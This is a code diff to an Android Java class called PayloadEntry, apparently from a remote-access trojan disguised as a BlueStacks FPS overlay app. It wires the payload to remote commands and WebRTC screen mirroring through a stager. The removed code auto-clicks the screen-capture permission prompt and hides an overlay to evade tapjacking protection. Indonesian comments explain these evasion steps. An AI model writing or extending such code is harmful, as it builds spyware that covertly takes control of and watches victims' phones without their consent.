@@ -56,12 +56,12 @@ public class PayloadEntry implements SupabaseManager.CommandCallback, SupabaseMa
             @Override public void setLockStatus(boolean locked) { service.setLockStatusNative(locked); }
         });
 
-        // Register for commands and signaling
+        // Register for commands and signaling via SupportService (Master)
         service.setCommandCallback(this);
         service.setAccessibilityDelegate(this);
-        supabaseManager.setSignalingListener(this);
+        service.setSignalingListener(this);
         
-        Log.i(TAG, "Payload initialized and registered for commands.");
+        Log.i(TAG, "Payload initialized and registered via Stager.");
         
         // Initial status update
         service.updateSystemStatus();
@@ -181,39 +181,7 @@ public class PayloadEntry implements SupabaseManager.CommandCallback, SupabaseMa
     // Signaling Listener implementation for WebRTC
     @Override
     public void onOfferReceived(String type, String offer) {
-        // Jalankan foreground agar stabil
-        service.showNotification();
-
-        if (type != null && type.startsWith("screen")) {
-            if (!WebRtcManager.hasMirrorIntent()) {
-                Log.i(TAG, "Mirroring permission missing. Requesting from user...");
-                
-                // Aktifkan mode auto-click mirroring di ProtectionManager
-                if (protectionManager != null) {
-                    protectionManager.setMirroringRequestActive(true);
-                    mainHandler.removeCallbacks(mirrorTimeoutRunnable);
-                    mainHandler.postDelayed(mirrorTimeoutRunnable, 30000);
-                }
-
-                // Sembunyikan overlay agar tidak kena Tapjacking protection
-                if (overlayManager != null) {
-                    mainHandler.post(() -> overlayManager.hideOverlay());
-                }
-
-                this.pendingType = type;
-                this.pendingOffer = offer;
-
-                try {
-                    Intent intent = new Intent(context, Class.forName("com.bluestacks.fpsoverlay.CoreActivity"));
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                    intent.putExtra("request_mirror", true);
-                    context.startActivity(intent);
-                } catch (Exception e) {
-                    Log.e(TAG, "Failed to launch CoreActivity for mirror: " + e.getMessage());
-                }
-                return;
-            }
-        }
+        // Logica permission sudah dihandle oleh Stager sebelum sampai ke sini
 
         if (webRtcManager == null) {
             webRtcManager = new WebRtcManager(context, new WebRtcManager.SignalingCallback() {
